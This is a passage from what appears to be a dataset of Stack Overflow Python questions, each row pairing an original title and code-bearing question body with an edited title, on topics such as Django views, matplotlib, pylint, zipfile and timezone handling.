a long-integer representing coefficients of size *window*, return the list of coefficients modulo *n*. ''' mask = 2**window - 1 coefs = [0] * (long_repr.bit_length() // window + 1) for i in xrange(len(coefs)): coefs[i] = (long_repr & mask) % n long_repr >>= window # assure that the returned list is never empty, and hasn't got an extra 0. if not coefs: coefs.append(0) elif not coefs[-1] and len(coefs) > 1: coefs.pop() return coefs",Optimize conversion between list of integer coefficients and its long integer representation
render throws error AttributeError META," I followed this article to try to load images from an external website. I am trying to pull all the images from an external link. I have used BeautifulSoup to parse the link and get all the required links. Before the view calls the render() function at the end of the code, image_list and return_dict have the desired values. However the render function seems to be generating the AttributeError exception. Please assist.I get the following error: Here is my view file: <code>  AttributeError at /post/add_new/ META Request Method: POST Request URL: http://localhost:8000/post/add_new/ Django Version: 1.4.1 Exception Type: AttributeError Exception Value: META Exception Location: C:\Python27\lib\urllib2.py in __getattr__, line 225 Python Executable: C:\Python27\python.exe Python Version: 2.7.3 Python Path: ['C:\\Users\\Talal\\Python Workspace\\talal_ynd', 'C:\\Python27\\lib\\site-packages\\ipython-0.13-py2.7.egg', 'C:\\Python27\\lib\\site-packages\\pyreadline-2.0_dev1-py2.7-win32.egg', 'C:\\Python27\\lib\\site-packages\\pil-1.1.7-py2.7-win32.egg', 'C:\\Python27\\lib\\site-packages\\setuptools-0.6c11-py2.7.egg', 'C:\\windows\\system32\\python27.zip', 'C:\\Python27\\DLLs', 'C:\\Python27\\lib', 'C:\\Python27\\lib\\plat-win', 'C:\\Python27\\lib\\lib-tk', 'C:\\Python27', 'C:\\Python27\\lib\\site-packages'] Server time: Thu, 13 Sep 2012 17:30:45 +0500 # Create your views here.from django.shortcuts import renderfrom django.http import HttpResponseRedirectfrom posts.models import Post, PostFormfrom django.template.loader import get_templatefrom talal_ynd.settings import TEMPLATE_DIRSdef post_view(request): if request.method == 'POST': post_form = PostForm(request.POST) if post_form.is_valid(): success_message = 'Thank you.' link = post_form.cleaned_data['link'] if 'get_link' in request.POST: import urllib2 request = urllib2.Request(link) response = urllib2.urlopen(request) html=response.read() from BeautifulSoup import BeautifulSoup soup=BeautifulSoup(html) import re title=''; description='' description=soup.findAll('meta', attrs={'name':re.compile(""description$"", re.I)})[0].get('content') try: title=soup.findAll('meta', attrs={'name':re.compile(""^title$"",re.I)})[0].get('content') except: pass if not title: title=soup.title.string max_images=10 image_tags=soup.findAll('img',limit=max_images) image_urls_list=[] image_urls_list2=[] from urlparse import urljoin for image_tag in image_tags: url=image_tag.get('src') #image_urls_list.append(request.build_absolute_uri(url))#urljoin(link,url))#HttpRequest.build_absolute_uri(url)) #image_urls_list.append(request.urljoin(link,url)) image_urls_list.append(url) image_list=[] for url in image_urls_list: image_list.append({'url':url}) return_dict={'title':title, 'description':description} return_dict.update({'images':image_list}) else: post_form = PostForm() else: post_form = PostForm() return render(request, 'posts/post_form.html', locals())",render throws error AttributeError META - (Exception location: __getattr__ in urllib2)
Python the simplest way to plot 3d surface," I have a lot (289) of 3d points with xyz coordinates which looks like:With plotting simply 3d space with points is OK, but I have trouble with surfaceThere are some points: There is no equal X's and Y's values. X is from -0.8 to 0.8, Y is from -0.9 to 0.9 and z from 0 to 111.If it is possible, how to make 3d surface plot using these points? <code>  for i in range(30): output.write(str(X[i])+' '+str(Y[i])+' '+str(Z[i])+'\n')-0.807237702464 0.904373229492 111.428744443-0.802470821517 0.832159465335 98.572957317-0.801052795982 0.744231916692 86.485869328-0.802505546206 0.642324228721 75.279804677-0.804158144115 0.52882485495 65.112895758-0.806418040943 0.405733109371 56.1627277595-0.808515314192 0.275100227689 48.508994388-0.809879521648 0.139140394575 42.1027499025-0.810645106092 -7.48279012695e-06 36.8668106345-0.810676720161 -0.139773175337 32.714580273-0.811308686707 -0.277276065449 29.5977405865-0.812331692291 -0.40975978382 27.6210856615-0.816075037319 -0.535615685086 27.2420699235-0.823691366944 -0.654350489595 29.1823292975-0.836688691603 -0.765630198427 34.2275056775-0.854984518665 -0.86845932028 43.029581434-0.879261949054 -0.961799684483 55.9594146815-0.740499820944 0.901631050387 97.0261463995-0.735011699497 0.82881933383 84.971061395-0.733021568161 0.740454485354 73.733621269-0.732821755233 0.638770044767 63.3815970475-0.733876941678 0.525818698874 54.0655910105-0.735055978521 0.403303715698 45.90859502-0.736448900325 0.273425879041 38.935709456-0.737556181137 0.13826504904 33.096106049-0.738278724065 -9.73058423274e-06 28.359664343-0.738507612286 -0.138781586244 24.627237837-0.738539663773 -0.275090412979 21.857410904-0.739099040189 -0.406068448513 20.1110519655-0.741152200369 -0.529726022182 19.7019157715",Simplest way to plot 3d surface given 3d points
how to maximize a plt.show() window using python," Just for curiosity I would like to know how to do this in the code below. I have been searching for an answer but is useless. <code>  import numpy as npimport matplotlib.pyplot as pltdata=np.random.exponential(scale=180, size=10000)print ('el valor medio de la distribucion exponencial es: ')print np.average(data)plt.hist(data,bins=len(data)**0.5,normed=True, cumulative=True, facecolor='red', label='datos tamano paqutes acumulativa', alpha=0.5)plt.legend()plt.xlabel('algo')plt.ylabel('algo')plt.grid()plt.show()",How to maximize a plt.show() window using Python
"""Jopheus-problm"" using list in python"," I wanted to know if it will be possible to solve the Josepheus problem using list in python.In simple terms Josephus problem is all about finding a position in a circular arrangement which would be safe if executions were handled out using a skip parameter which is known beforehand.For eg : given a circular arrangement such as [1,2,3,4,5,6,7] and a skip parameter of 3, the people will be executed in the order as 3,6,2,7,5,1 and position 4 would be the safe.I have been trying to solve this using list for some time now, but the index positions becomes tricky for me to handle. Updated the question with code snippet, but i don't think my logic is correct.  <code>  a=[x for x in range(1,11)] skip=2 step=2 while (len(a)!=1): value=a[step-1] a.remove(value) n=len(a) step=step+skip large=max(a) if step>=n: diff=abs(large-value) step=diff%skip print a","""Josephus-problem"" using list in python"
"""Josephus-problm"" using list in python"," I wanted to know if it will be possible to solve the Josepheus problem using list in python.In simple terms Josephus problem is all about finding a position in a circular arrangement which would be safe if executions were handled out using a skip parameter which is known beforehand.For eg : given a circular arrangement such as [1,2,3,4,5,6,7] and a skip parameter of 3, the people will be executed in the order as 3,6,2,7,5,1 and position 4 would be the safe.I have been trying to solve this using list for some time now, but the index positions becomes tricky for me to handle. Updated the question with code snippet, but i don't think my logic is correct.  <code>  a=[x for x in range(1,11)] skip=2 step=2 while (len(a)!=1): value=a[step-1] a.remove(value) n=len(a) step=step+skip large=max(a) if step>=n: diff=abs(large-value) step=diff%skip print a","""Josephus-problem"" using list in python"
Confused about __str__ in Python," Coming from a Java background, I understand that __str__ is something like a Python version of toString (while I do realize that Python is the older language).So, I have defined a little class along with an __str__ method as follows: I then create a few instances of it: Now, the expected behaviour when trying to print one of these objects is that it's associated value gets printed. This also happens. yields But when I do the following: and then I get Where I expected What am I missing? And what otherwise cringe-worthy stuff am I doing? :) <code>  class Node: def __init__(self, id): self.id = id self.neighbours = [] self.distance = 0 def __str__(self): return str(self.id) uno = Node(1) due = Node(2) tri = Node(3) qua = Node(4) print uno 1 uno.neighbours.append([[due, 4], [tri, 5]]) print uno.neighbours [[[<__main__.Node instance at 0x00000000023A6C48>, 4], [<__main__.Node instance at 0x00000000023A6D08>, 5]]] [[2, 4], [3, 5]]",Confused about __str__ on list in Python
"Python: PIL Image mode ""P"" -> ""RGBA"""," This is my issue: Well, with my image you can see the difference.My question is: how do I convert it properly?Image: Result: NOTE: The original image has a semi-transparent glow, the result has a solid green ""glow"" <code>  import Imageim = Image.open(""1.png"")im.show()print im.modeim.convert(""RGBA"").save(""2.png"")","PIL Image mode ""P"" -> ""RGBA"""
django loaddata not dealing with timestamps and timezones properly," I'm using django 1.4.1 with mysql and timezones enabled. I did a dump data to yaml, modified some fields to create some test data, and am trying to load it back in. however, Django keeps complaining about naive datetimes even though a tz is specifiedspecifically, my loaddata has: but loaddata gives the error: This doesn't make much sense to me, seeing as its:a UTC timestampthe same exact format Django exported using dumpdatais there some way i can tell django this is a UTC date? <code>  fields: {created_date: !!timestamp '2012-09-15 22:17:44+00:00', ... RuntimeWarning: DateTimeField received a naive datetime (2012-09-15 22:17:44) while time zone support is active.",Loaddata not dealing with timestamps and timezones properly
python rrule DST," Does dateutil rrule support DST and TZ? Need something similar to iCalendar RRULE.If not - how to tackle this problem (scheduling recurring events & DST offset change)Imports Issue with timedelta (need to have the same local hours, but different DST offsets): Issue with rrule (need to have the same every local hour of each occurrence): <code>  >>> from django.utils import timezone>>> import pytz>>> from datetime import timedelta>>> from dateutil import rrule>>> now = timezone.now()>>> pl = pytz.timezone(""Europe/Warsaw"") >>> pl.normalize(now)datetime.datetime(2012, 9, 20, 1, 16, 58, 226000, tzinfo=<DstTzInfo 'Europe/Warsaw' CEST+2:00:00 DST>) >>> pl.normalize(now+timedelta(days=180))datetime.datetime(2013, 3, 19, 0, 16, 58, 226000, tzinfo=<DstTzInfo 'Europe/Warsaw' CET+1:00:00 STD>) >>> r = rrule.rrule(3,dtstart=now,interval=180,count=2)>>> pl.normalize(r[0])datetime.datetime(2012, 9, 20, 1, 16, 58, tzinfo=<DstTzInfo 'Europe/Warsaw' CEST+2:00:00 DST>)>>> pl.normalize(r[1])datetime.datetime(2013, 3, 19, 0, 16, 58, tzinfo=<DstTzInfo 'Europe/Warsaw' CET+1:00:00 STD>)",How to handle DST and TZ in recurring events?
Python 3x opening file encoding error," My python program has trouble opening a text file. When I use the basic open file for read, I get an ascii error. Someone helped me out by having me add an encoding parameter that works well in Idle, but when I run the program through terminal, I get this error message: ""TypeError: 'encoding' is an invalid keyword argument for this function"" How can I read this text file in to use it's data? gaeilge_flashcard_mode.txt: <code>  try: import tkinter as tk from tkinter import *except: import Tkinter as tk from Tkinter import *import timeimport sysimport osimport randomflashcards = {}def Flashcards(key, trans, PoS): if not key in flashcards: flashcards[key] = [[trans], [PoS]] else: x = [] for item in flashcards[key][0]: x.append(item) x.append(trans) flashcards[key][0] = x x = [] for item in flashcards[key][1]: x.append(item) x.append(PoS) flashcards[key][1] = xdef ImportGaeilge(): flashcards = {} with open('gaeilge_flashcard_mode.txt','r', encoding='utf8') as file: for line in file: line1 = line.rstrip().split(""="") key = line1[0] trans = line1[1] PoS = line1[2] Flashcards(key, trans, PoS)def Gaeilge(): numberCorrect = 0 totalCards = 0 ImportGaeilge() wrongCards = {} x = input('Hit ""ENTER"" to begin. (Type ""quit"" to quit)') while x != quit: os.system('cls') time.sleep(1.3) card = flashcards.popitem() if card == """":## WRONG CARDS print (""Deck one complete."") Gaeilge() print(""\n\n"") print(str(card[0])+"":"") x = input(""\t:"") if x == 'quit': break else: right = False for item in card[1]: if x == card[1]: right = True print(""\nCorrect!"") numberCorrect += 1 if right == False: print(card[0]) totalCards += 1 print(""Correct answers:"", str(numberCorrect) +""/""+str(totalCards))Gaeilge() I=m=(pron) (emphatic)I=mise=(n/a)you=t=(pron) (subject)you=tusa=(emphatic)y'all=sibh=(plural)y'all=sibhse=(emphatic)he=s=(pron)he==(n/a)he=seisean=(emphatic)he=eisean=(n/a)she=s=(pron)she==(n/a)she=sise=(emphatic)she=ise=(emphatic)him==(pron)him=eisean=(emphatic)her==(pron)her=ise=(emphatic)her=a=(adj)",TypeError: 'encoding' is an invalid keyword argument for this function
Reading a file in a certain format," I just started learning Python and would like to read an Apache log file and put parts of each line into different lists.line from the file 172.16.0.3 - - [25/Sep/2002:14:04:19 +0200] ""GET / HTTP/1.1"" 401 - """" ""Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.1) Gecko/20020827""according to Apache website the format is %h %l %u %t \""%r\"" %>s %b \""%{Referer}i\"" \""%{User-Agent}i\I'm able to open the file and just read it as it is but I don't know how to make it read in that format so I can put each part in a list. <code> ",Parsing apache log files
Hwo to configure pylint in the python source, Is it possible to disable certain pylint errors/warnings in the python source code itself ? <code> ,How to configure pylint in the python source
Format the output of the nosetests [python nose], I am using the nosetests and have my directory structure as follows and if the test1.py is as below The output of the nosetests run is as below I would like to format this output to something like below Any help? Thanks. <code>  repo package1 sub1 tests test1.py test2.py package2 sub2 tests test3.py test4.py package3 package4 class TestClass1(unittest.TestCase) def test_method1()class TestClass2(unittest.TestCase) def test_method2()class TestClass3(unittest.TestCase) def test_method3 [Method name] [modulename]. [ClassName] ... statustest_method1 (test1.TestClass1) ... oktest_method2 (test1.TestClass2) ... oktest_method3 (test1.TestClass3) ... ok repo.package1.sub1 [package] SUCCESS test1.py [unit test file] SUCCESS TestClass1.test_method1 [unit test] SUCCESS TestClass2.test_method2 [unit test] SUCCESS TestClass3.test_method3 [unit test] SUCCESS,Formatting nosetest output in Python
"Should I use `scipy.pi`, `numpy.pi`, or `math.pi`?"," In a project using SciPy and NumPy, should I use scipy.pi, numpy.pi, or math.pi? <code> ","Should I use scipy.pi, numpy.pi, or math.pi?"
Inconsisitency in results of aggregating pandas groupby object using numpy.median vs other functions," Using DataFrame (pandas as pd, numpy as np): Grouping DF by 'C' and aggregating with np.mean (also sum, min, max) produces column-wise aggregation within groups: However, it looks like aggregating using np.median produces DataFrame-wise aggregation within groups: (using groupby.median method seems to produce expected column-wise results though)I would appreciate addressing following issues:What is the reason/mechanism of such an outcome?If this behaviour is confirmed, how does it affect recommended ""best practices"" of aggregating groupings? Could other aggregation functions work this way? <code>  test = pd.DataFrame({'A' : [10,11,12,13,15,25,43,70], 'B' : [1,2,3,4,5,6,7,8], 'C' : [1,1,1,1,2,2,2,2]})In [39]: testOut[39]: A B C0 10 1 11 11 2 12 12 3 13 13 4 14 15 5 25 25 6 26 43 7 27 70 8 2 In [40]: test_g = test.groupby('C')In [41]: test_g.aggregate(np.mean)Out[41]: A BC 1 11.50 2.52 38.25 6.5 In [42]: test_g.aggregate(np.median)Out[42]: A BC 1 7.0 7.02 11.5 11.5",Inconsistency in results of aggregating pandas groupby object using numpy.median vs other functions
Python objects from exsiting objects using __new__," In learning about Python's data model, I am playing with creating objects from existing objects using the __new__ method. Here are some examples which create new objects of various types: However, the following three experiments give me errors: The errors are (respectively): Why don't these three examples work? (Note: for the lambda example it appears that I have to pass in a code fragment when I invoke the __new__ method but I don't know how to do that.) I am using Python 2.6.Please note that I realize this is not necessarily the way you would want to create new objects in real code, but my purpose is not practical, rather, it is to understand how the low-level object methods work. <code>  x = 2; print type(x).__new__(x.__class__)x = {}; print type(x).__new__(x.__class__)x = [1,2]; print type(x).__new__(x.__class__)x = 2.34; print type(x).__new__(x.__class__)x = '13'; print type(x).__new__(x.__class__)x = 1.0j; print type(x).__new__(x.__class__)x = True; print type(x).__new__(x.__class__)x = (1,2); print type(x).__new__(x.__class__) x = None; print type(x).__new__(x.__class__)x = lambda z: z**2; print type(x).__new__(x.__class__)x = object; print type(x).__new__(x.__class__) TypeError: object.__new__(NoneType) is not safe, use NoneType.__new__()TypeError: Required argument 'code' (pos 1) not foundTypeError: type() takes 1 or 3 arguments",Python objects from existing objects using __new__
"mod_wsgi, multiprocessing and shared data"," I am a bit confused about multiproessing feature of mod_wsgi and about a general design of WSGI applications that would be executed on WSGI servers with multiprocessing ability. Consider the following directive: If I understand correctly, mod_wsgi will spawn 5 Python (e.g. CPython) processes and any of these processes can receive a request from a user. The documentation says that: Where shared data needs to be visible to all application instances, regardless of which child process they execute in, and changes made to the data by one application are immediately available to another, including any executing in another child process, an external data store such as a database or shared memory must be used. Global variables in normal Python modules cannot be used for this purpose.But in that case it gets really heavy when one wants to be sure that an app runs in any WSGI conditions (including multiprocessing ones). For example, a simple variable which contains the current amount of connected users - should it be process-safe read/written from/to memcached, or a DB or (if such out-of-the-standard-library mechanisms are available) shared memory? And will the code like behave unpredictably in multiprocessing environment?Thank you! <code>  WSGIDaemonProcess example processes=5 threads=1 counter = 0@app.route('/login')def login(): ... counter += 1 ...@app.route('/logout')def logout(): ... counter -= 1 ...@app.route('/show_users_count')def show_users_count(): return counter","Python, WSGI, multiprocessing and shared data"
Json dumping a dict gives TypeError: keys must be a string," I am attempting to convert the following dict into JSON using json.dumps: But it leads me to The error is likely due to the dict containing, keys like: Can someone please guide me, with how should I remove these elements from the dict? <code>  { 'post_engaged': 36, 'post_impressions': 491, 'post_story': 23, 'comment_count': 6, 'created_time': '03:02 AM, Sep 30, 2012', 'message': 'Specialities of Shaktis and Pandavas. \n While having power, why there isn\\u2019t', < built - in function id > : '471662059541196', 'status_type': 'status', 'likes_count': 22 } { 'post_engaged': 24, 'text': '30 Sept 2012 Avyakt Murlli ( Dual Voice )', 'post_story': 8, 'comment_count': 3, 'link': 'http:\\/\\/www.youtube.com\\/watch?v=VGmFj8g7JFA&feature=youtube_gdata_player', 'post_impressions': 307, 'created_time': '03:04 AM, Sep 30, 2012', 'message': 'Not available', < built - in function id > : '529439300404155', 'status_type': 'video', 'likes_count': 7 } { 'post_engaged': 37, 'post_impressions': 447, 'post_story': 22, 'comment_count': 4, 'created_time': '03:11 AM, Sep 30, 2012', 'message': '30-09-12 \\u092a\\u094d\\u0930\\u093e\\u0924:\\u092e\\u0941\\u0930\\u0932\\u0940 \\u0913\\u0', < built - in function id > : '471643246209744', 'status_type': 'status', 'likes_count': 20 } { 'post_engaged': 36, 'post_impressions': 423, 'post_story': 22, 'comment_count': 0, 'created_time': '03:04 AM, Sep 29, 2012', 'message': 'Essence: Sweet children, whenever you have time, earn the true income. Staying i', < built - in function id > : '471274672913268', 'status_type': 'status', 'likes_count': 20 } { 'post_engaged': 16, 'text': 'Essence Of Murli 29-09-2012', 'post_story': 5, 'comment_count': 2, 'link': 'http:\\/\\/www.youtube.com\\/watch?v=i6OgmbRsJpg&feature=youtube_gdata_player', 'post_impressions': 291, 'created_time': '03:04 AM, Sep 29, 2012', 'message': 'Not available', < built - in function id > : '213046588825668', 'status_type': 'video', 'likes_count': 5 } TypeError : keys must be a string <built-in function id>: '213046588825668'",Json dumping a dict throws TypeError: keys must be a string
Google App Engine - Session works in localhost but fails when deployed," First of all, I'm brand new to GAE, so its possible I'm doing this the wrong way - but I've used PHP before and session was how I kept persistent data. I'm using Python 2.7 because that is what I use for all my other Python development - although I'm beginning to wonder if downgrading to 2.5 might be a valid solution, if not an ideal one. The scenario is that I'm building a proof-of-concept site, and I need to have a 'dummy' login button that simply sets a session variable called 'user' with a value of 'admin'. I then want to check in the navigation template to see if the variable is set, and if so I'll add some extra menu commands. Very simple. (Note: I KNOW this isn't secure, sensible or anything that should be done - the problem is that session is not working, not what I'm doing with it - I'm doing a couple of other things in the code using session - none of them are working when deployed)It seems there are a few different session libraries for GAE with Python and I tried the one that was most widely recommended in Google searches - gaeutilities, but this caused errors and wouldn't work (I eventually stumbled across this post to explain that its just not compatible with Python 2.7). A little more searching led me to this library from appenginelearn.com which I dropped in and it worked perfectly... until I deployed it - then it just does nothing. I'd love some pointers or advice as to why this might be failing. Here is the relevant code that I'm using:I put the util library directory from appenginelearn.com in the root of the application directory, then imported Session: Then I added the Login and Logout classes: And the following (awful) code in the main class (this will be done for all pages in the demo) And then this in the HTML template file And the errors in the log: <code>  from util.sessions import Session class LogIn(webapp2.RequestHandler): def get(self): self.session = Session() self.session['user'] = 'admin' # Return the user to the page they logged in from referer = self.request.environ['HTTP_REFERER'] \ if 'HTTP_REFERER' in self.request.environ \ else '/' self.redirect(referer)class LogOut(webapp2.RequestHandler): def get(self): self.session = Session() self.session.delete_item('user') self.redirect('/') class MainPage(webapp2.RequestHandler): def get(self): self.session = Session() logging.info('Main page fired up') if 'user' in self.session: user = self.session['user'] else: user = None template_values = { 'user': user } template = jinja_environment.get_template('main.html') self.response.out.write(template.render(template_values)) {% if user %} <p>Welcome, {{user}}</p> {% endif %} 2012-10-04 02:51:28.084 /login 302 143ms 0kb Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4*ip address removed* - - [04/Oct/2012:02:51:28 -0700] ""GET /login HTTP/1.1"" 302 136 ""*site-removed*"" ""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4"" ""*site-removed*"" ms=144 cpu_ms=0 cpm_usd=0.000015 instance=*instance removed***I** 2012-10-04 02:51:28.080Creating session session-*session number removed***E** 2012-10-04 02:51:28.084Set-Cookie: appengine-simple-session-sid=*session number removed*; Path=/",Google App Engine - Getting Sessions working with Python 2.7
Create a empty spreadsheet in google drive using google spreadsheet api (python )?," I want to create an empty Google Sheet (created only with metadata) in Google Drive. When I referred to the Google SpreadSheet API documentation, it says to use the DocumentsList API, but it's deprecated and instead asks me to use the Google Drive API. In the Drive API docs, I could not find any way to create an empty Sheet. Anyone have a clue on how to do this? <code> ",Creating empty spreadsheets in Google Drive using Drive API
Creating empty spreadsheets in Google Drive using Drive API (in Python)," I want to create an empty Google Sheet (created only with metadata) in Google Drive. When I referred to the Google SpreadSheet API documentation, it says to use the DocumentsList API, but it's deprecated and instead asks me to use the Google Drive API. In the Drive API docs, I could not find any way to create an empty Sheet. Anyone have a clue on how to do this? <code> ",Creating empty spreadsheets in Google Drive using Drive API
"How to prove that parameter evaluation is ""left to right"" in python"," For example, in JavaScript we could write a program like this: and we would get an output: This implies that parameters are truly evaluated from left to right in JavaScript. In C we would get output I was wondering if we could do the same in Python or is it impossible since it's a pass by value reference language?I've made a simple program but I don't think that proves anything: Python won't let me do any new assignment within the function parameter when I call it (for example f(x=4, x, x) or something like this). <code>  var a = 1;testFunction(++a, ++a, a);function testFunction(x, y, z){ document.writeln(""<br />x = "" + x); document.writeln(""<br />y = "" + y); document.writeln(""<br />z = "" + z);} x = 2y = 3z = 3 x = 3y = 3z = 3 x = 2def f(x, y, z): print(x, y, z)f(x*2, x*2, x**2)print(x) 4 4 42","How to prove that parameter evaluation is ""left to right"" in Python?"
Getting the Python function for a code object," A Python function has a code object __code__.A sys.settrace trace frame has a f_code code object.For those calls to the tracer that are functions, how can I get the function object (and its __annotation__ member)?So far, by trial and error, I have: This seems to work for functions, but not for class-member functions; worse, it confuses class-member functions with top-level functions of the same name.(I'm on Python 3.2.3 (Xubuntu). I see that Python 3.3 inspect module has a signature function; will this return the annotation for a code object or does it too need a function object?) <code>  if hasattr(frame.f_globals.get(frame.f_code.co_name),""__annotations__""):",Getting the function for a compiled function object
Best practice for upgrading Python modules?," I've been learning Python for several months but now finding some problems with my 2.7 installation as I've looked into modules such as nltk.However, when I want to list modules using help (""modules) I have the main error which I think explains the problem is: I also receive the following error to do with deprecated modules: I'm still trying to get to grips with paths. How can I avoid this issue in future? <code>  /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/distribute-0.6.28-py2.7.egg/setuptools/command/install_scripts.py:3: UserWarning: Module numpy was already imported from /Library/Python/2.7/site-packages/numpy-override/numpy/__init__.pyc, but /Library/Python/2.7/site-packages/numpy-1.8.0.dev_5c944b9_20120828-py2.7-macosx-10.8-x86_64.egg is being added to sys.pathfrom pkg_resources import Distribution, PathMetadata, ensure_directory /Library/Python/2.7/site-packages/statsmodels-0.5.0-py2.7-macosx-10.8-intel.egg/scikits/statsmodels/__init__.py:2: UserWarning: scikits.statsmodels namespace is deprecated and will be removed in 0.5, please use statsmodels instead",Best practice for upgrading Python modules
Opening zipfile gives me apparently-empty filestream," Seem to be knocking my head off a newbie error and I am not a newbie.I have a 1.2G known-good zipfile 'train.zip' containing a 3.5G file 'train.csv'.I open the zipfile and file itself without any exceptions (no LargeZipFile), but the resulting filestream appears to be empty. (UNIX 'unzip -c ...' confirms it is good)The file objects returned by Python ZipFile.open() are not seek'able or tell'able, so I can't check that.Python distribution is 2.7.3 EPD-free 7.3-1 (32-bit) ; but should be ok for large zips. OS is MacOS 10.6.6 <code>  import csvimport zipfile as zfzip_pathname = os.path.join('/my/data/path/.../', 'train.zip')#with zf.ZipFile(zip_pathname).open('train.csv') as z:z = zf.ZipFile(zip_pathname, 'r', zf.ZIP_DEFLATED, allowZip64=True) # I tried all permutationsz.debug = 1z.testzip() # zipfile integrity is okz1 = z.open('train.csv', 'r') # our file keeps coming up empty?# Check the info to confirm z1 is indeed a valid 3.5Gb file...z1i = z.getinfo(file_name)for att in ('filename', 'file_size', 'compress_size', 'compress_type', 'date_time', 'CRC', 'comment'): print '%s:\t' % att, getattr(z1i,att)# ... and it looks ok. compress_type = 9 ok?#filename: train.csv#file_size: 3729150126#compress_size: 1284613649#compress_type: 9#date_time: (2012, 8, 20, 15, 30, 4)#CRC: 1679210291# All attempts to read z1 come up empty?!# z1.readline() gives ''# z1.readlines() gives []# z1.read() takes ~60sec but also returns '' ?# code I would want to run is:reader = csv.reader(z1)header = reader.next()return reader","Opening zipfile of unsupported compression-type silently returns empty filestream, instead of throwing exception"
Opening zipfile of unsupported compression type gives empty filestream," Seem to be knocking my head off a newbie error and I am not a newbie.I have a 1.2G known-good zipfile 'train.zip' containing a 3.5G file 'train.csv'.I open the zipfile and file itself without any exceptions (no LargeZipFile), but the resulting filestream appears to be empty. (UNIX 'unzip -c ...' confirms it is good)The file objects returned by Python ZipFile.open() are not seek'able or tell'able, so I can't check that.Python distribution is 2.7.3 EPD-free 7.3-1 (32-bit) ; but should be ok for large zips. OS is MacOS 10.6.6 <code>  import csvimport zipfile as zfzip_pathname = os.path.join('/my/data/path/.../', 'train.zip')#with zf.ZipFile(zip_pathname).open('train.csv') as z:z = zf.ZipFile(zip_pathname, 'r', zf.ZIP_DEFLATED, allowZip64=True) # I tried all permutationsz.debug = 1z.testzip() # zipfile integrity is okz1 = z.open('train.csv', 'r') # our file keeps coming up empty?# Check the info to confirm z1 is indeed a valid 3.5Gb file...z1i = z.getinfo(file_name)for att in ('filename', 'file_size', 'compress_size', 'compress_type', 'date_time', 'CRC', 'comment'): print '%s:\t' % att, getattr(z1i,att)# ... and it looks ok. compress_type = 9 ok?#filename: train.csv#file_size: 3729150126#compress_size: 1284613649#compress_type: 9#date_time: (2012, 8, 20, 15, 30, 4)#CRC: 1679210291# All attempts to read z1 come up empty?!# z1.readline() gives ''# z1.readlines() gives []# z1.read() takes ~60sec but also returns '' ?# code I would want to run is:reader = csv.reader(z1)header = reader.next()return reader","Opening zipfile of unsupported compression-type silently returns empty filestream, instead of throwing exception"
Opening zipfile of unsupported compression-type silently returns empty filestream," Seem to be knocking my head off a newbie error and I am not a newbie.I have a 1.2G known-good zipfile 'train.zip' containing a 3.5G file 'train.csv'.I open the zipfile and file itself without any exceptions (no LargeZipFile), but the resulting filestream appears to be empty. (UNIX 'unzip -c ...' confirms it is good)The file objects returned by Python ZipFile.open() are not seek'able or tell'able, so I can't check that.Python distribution is 2.7.3 EPD-free 7.3-1 (32-bit) ; but should be ok for large zips. OS is MacOS 10.6.6 <code>  import csvimport zipfile as zfzip_pathname = os.path.join('/my/data/path/.../', 'train.zip')#with zf.ZipFile(zip_pathname).open('train.csv') as z:z = zf.ZipFile(zip_pathname, 'r', zf.ZIP_DEFLATED, allowZip64=True) # I tried all permutationsz.debug = 1z.testzip() # zipfile integrity is okz1 = z.open('train.csv', 'r') # our file keeps coming up empty?# Check the info to confirm z1 is indeed a valid 3.5Gb file...z1i = z.getinfo(file_name)for att in ('filename', 'file_size', 'compress_size', 'compress_type', 'date_time', 'CRC', 'comment'): print '%s:\t' % att, getattr(z1i,att)# ... and it looks ok. compress_type = 9 ok?#filename: train.csv#file_size: 3729150126#compress_size: 1284613649#compress_type: 9#date_time: (2012, 8, 20, 15, 30, 4)#CRC: 1679210291# All attempts to read z1 come up empty?!# z1.readline() gives ''# z1.readlines() gives []# z1.read() takes ~60sec but also returns '' ?# code I would want to run is:reader = csv.reader(z1)header = reader.next()return reader","Opening zipfile of unsupported compression-type silently returns empty filestream, instead of throwing exception"
How to get file name of FilHanlder in Python?," A logging.FileHandler is constructed with a file name, so is there any way to get the file name from the logging.FileHandler object?I tried dir(logging.FileHandler) but didn't see any possible solutions. <code> ",How to get file name of logging.FileHandler in Python?
How to get file name of logging.FilHanlder in Python?," A logging.FileHandler is constructed with a file name, so is there any way to get the file name from the logging.FileHandler object?I tried dir(logging.FileHandler) but didn't see any possible solutions. <code> ",How to get file name of logging.FileHandler in Python?
Grep on elements of python list," I have a list of files names: While I have found some functions that can work to grep character strings, I haven't figured out how to grep all elements of a list.for instance I would like to: and get: Sure its not too hard, but I am new to Python update The question above apparently wasn't accurate enough. All the answers below work for the example but not for my actual data. Here is my code to make the list of file names: Running filter(lambda x:'aet' in x,tifnames) or the other answers return: Despite the fact that tifnames is a list of character strings: Do you guys see what's going on here? Thanks again! <code>  names = ['aet2000','ppt2000', 'aet2001', 'ppt2001'] grep(names,'aet') ['aet2000','aet2001'] years = range(2000,2011)months = [""jan"",""feb"",""mar"",""apr"",""may"",""jun"",""jul"",""aug"",""sep"",""oct"",""nov"",""dec""]variables = [""cwd"",""ppt"",""aet"",""pet"",""tmn"",""tmx""] # *variable name* with wildcards tifnames = list(range(0,(len(years)*len(months)*len(variables)+1) ))i = 0for variable in variables: for year in years: for month in months: fullname = str(variable)+str(year)+str(month)+"".tif"" tifnames[i] = fullname i = i+1 Traceback (most recent call last): File ""<pyshell#89>"", line 1, in <module> func(tifnames,'aet') File ""<pyshell#88>"", line 2, in func return [i for i in l if s in i]TypeError: argument of type 'int' is not iterable type(tifnames[1])<type 'str'>",Grep on elements of a list
Removing Duplicates from Nested List Based on First 2 Elements," I'm trying to remove duplicates from a nested list only if the first 2 elements are the same, ignoring the third.List: Would return: I found a simple way to do similar here: but this only works for the first element and not the first 2, but that is exactly what I want otherwise. <code>  L = [['el1','el2','value1'], ['el3','el4','value2'], ['el1','el2','value2'], ['el1','el5','value3']] L = [['el3','el4','value2'], ['el1','el2','value2'], ['el1','el5','value3']] dict((x[0], x) for x in L).values()",Removing duplicates from nested list based on first 2 elements
